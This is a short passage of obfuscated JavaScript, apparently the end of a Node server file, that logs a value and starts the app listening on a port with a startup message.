_0x557f90=_0x4d28e1;console[_0x557f90(0x1d7)](_0x557f90(0x1b7),_0x13105e);}),app[_0x4d28e1(0x179)](PORT,()=>console[_0x4d28e1(0x1a4)](_0x4d28e1(0x19c)+PORT+'!'));
